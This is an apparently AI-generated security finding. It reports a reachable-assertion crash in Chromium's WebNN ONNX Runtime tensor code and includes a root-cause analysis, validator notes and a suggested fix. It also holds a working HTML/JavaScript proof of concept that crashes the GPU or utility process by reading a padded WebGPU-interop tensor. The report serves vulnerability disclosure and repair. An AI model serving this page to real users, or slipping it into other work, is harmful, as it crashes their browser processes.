# Security finding #761: AsSpan() returns a span of size_ = the ORT/shared-image allocation …

**Summary:** AsSpan() returns a span of size_ = the ORT/shared-image allocation …

**CWE IDs:** CWE-617: Reachable Assertion (CHECK) / size-mismatch abort
**Severity / Impact:** Controlled CHECK/abort crash of the GPU/utility process (DoS) triggerable by web content that uses a WebGPU-interop MLTensor whose backing shared image is padded larger than its packed byte length, then issues ReadTensor or WriteTensor. Not memory corruption — copy_from's equality CHECK actually refutes the OOB-write hypothesis in the work item — but a renderer-reachable process crash.
**Affected location:** `targets/chromium/services/webnn/ort/tensor_impl_ort.cc:74` — `TensorImplOrt::ReadTensorImpl / WriteTensorImpl()`
**Validated for repos:** chromiumWebnn
**Trust boundary:** compromised renderer → WebNN Mojo boundary (CreateTensor via WebGPU-interop shared image + ReadTensor/WriteTensor IPCs) → GPU/utility process

## Description / Root cause
AsSpan() returns a span of size_ = the ORT/shared-image allocation size, not the WebNN descriptor's PackedByteLength(). For a WebGPU-interop tensor created through CreateTensorFromSharedImageImpl, size_ is set to buffer_size (context_impl_ort.cc:563-568, 656-659), which the code itself documents 'may be larger [than PackedByteLength] due to alignment requirements'. ReadTensorImpl (line 74) then does CHECK_EQ(PackedByteLength(), buffer_span.size()) and WriteTensorImpl (line 82) calls dst_span.copy_from(src_buffer) where dst_span.size()==size_ but the renderer-supplied src_buffer is validated in webnn_tensor_impl.cc:100 to equal PackedByteLength(); base::span::copy_from CHECK_EQs the two sizes. When buffer_size > PackedByteLength, both paths hit a CHECK failure.

**Validator analysis:** The finding is accurate as a CWE-617 reachable assertion (controlled CHECK abort), NOT memory corruption. AsSpan() (tensor_impl_ort.cc:56-68) returns size_ bytes. For the WebGPU-interop constructor (tensor_impl_ort.cc:37-52), size_ is buffer_size, set in CreateTensorFromSharedImageImpl to representation->size().width() (context_impl_ort.cc:563-564), validated only as >= PackedByteLength (565-568); the code's own comment (561-562) states the shared-image size 'may be larger due to alignment requirements.' A read/write-usable interop tensor is reachable because the mapped-buffer fallback (623-644) unconditionally sets can_access_on_cpu=true, so the kRead/kWrite guard at 646-652 passes. ReadTensorImpl:74 then does CHECK_EQ(PackedByteLength(), size_) and dies whenever buffer_size>PackedByteLength; WriteTensorImpl:82 feeds a size_-byte dst_span into copy_from against a src validated to equal PackedByteLength (webnn_tensor_impl.cc:100), whose internal size CHECK_EQ likewise aborts. copy_from's equality check refutes the OOB-write hypothesis, so impact is a renderer-triggerable GPU/utility-process crash (DoS via reachable assertion), which is in-scope per the base prompt's CWE-617 inclusion (not a resource-exhaustion/OOM case). The proposed fix is correct and sufficient: have AsSpan() return the first PackedByteLength() bytes of the allocation while retaining size_ only for the zero-fill; that makes the read CHECK and write copy_from operate on the WebNN-visible window and never expose alignment padding. Only chromiumWebnn is validated; the downstream repos are N/A since the abort precedes ORT/OVEP/OV involvement. WPT is skipped: the observable effect is a process crash/CHECK abort, not a cleanly assertable throw.

## Exploit / Proof of Concept
Renderer creates a read/write-usable WebGPU-interop tensor (mapped-buffer fallback path, context_impl_ort.cc:623-644, always sets can_access_on_cpu=true) whose shared image is rounded up by alignment so buffer_size > PackedByteLength(). It passes CreateTensor validation. A subsequent ReadTensor IPC reaches ReadTensorImpl line 74 CHECK_EQ(PackedByteLength(), size_) → mismatch → intentional crash; likewise a WriteTensor with src_buffer.size()==PackedByteLength reaches copy_from into a size_-byte dst → CHECK_EQ mismatch → crash.

## Reproduction (html)
```
<!doctype html>
<html>
<head><meta charset="utf-8"><title>WebNN ORT interop CHECK abort repro</title></head>
<body>
<pre id="log"></pre>
<script>
const log = (m) => { document.getElementById('log').textContent += m + '\n'; };
// Trigger: create a WebGPU-interop MLTensor whose backing D3D12 shared image is
// rounded up (alignment) so buffer_size > PackedByteLength(), then readTensor().
// This reaches services/webnn/ort/tensor_impl_ort.cc:74 CHECK_EQ and aborts the
// GPU/utility process. Use a tiny tensor (a few bytes) so alignment padding is
// guaranteed.
(async () => {
  try {
    if (!navigator.ml) { log('WebNN not available'); return; }
    if (!navigator.gpu) { log('WebGPU not available (needed for interop)'); return; }
    const adapter = await navigator.gpu.requestAdapter();
    const device = await adapter.requestDevice();
    // GPU-backed MLContext tied to the WebGPU device enables MLTensor<->WebGPU interop.
    const context = await navigator.ml.createContext(device);
    // Small, readable, WebGPU-interop tensor. PackedByteLength = 1*4 = 4 bytes,
    // but the D3D12 shared buffer allocation is padded up (>=256B) => size_ != 4.
    const desc = {
      dataType: 'float32',
      shape: [1],
      readable: true,
      writable: true,
      exportableToGPU: true   // request WebGPU-interop backing (shared image)
    };
    const tensor = await context.createTensor(desc);
    log('createTensor succeeded; issuing readTensor to hit CHECK_EQ...');
    // ReadTensor IPC -> WebNNTensorImpl::ReadTensor -> TensorImplOrt::ReadTensorImpl
    // -> CHECK_EQ(PackedByteLength()==4, AsSpan().size()==padded buffer_size) -> abort.
    await context.readTensor(tensor);
    log('readTensor returned (no crash) - padding may not have occurred on this device');
  } catch (e) {
    log('JS-visible error (process may have crashed instead): ' + e);
  }
})();
</script>
</body>
</html>
```

## Test
_(not provided)_


## Suggested fix
Do not size AsSpan() by the raw ORT/shared-image allocation. Store PackedByteLength() as the logical size and have AsSpan() return that many bytes (a first-N subspan of the allocation), e.g. return base::span(ptr, PackedByteLength()); keep size_ only for the fill/zero-init. Then ReadTensorImpl's CHECK_EQ and WriteTensorImpl's copy_from operate on the WebNN-visible window and cannot mismatch, and reads never expose the alignment-padding bytes.

## Models used

| Role | Provider / model |
| --- | --- |
| Idea | `claude-4-6-sonnet` |
| Tech lead | `claude-4-6-sonnet` |
| Researcher | `claude-4-8-opus` |
| Validator | `claude-4-8-opus` |


---
_Filed by an automated security-scan harness; AI-generated — review before acting._ Finding #761.
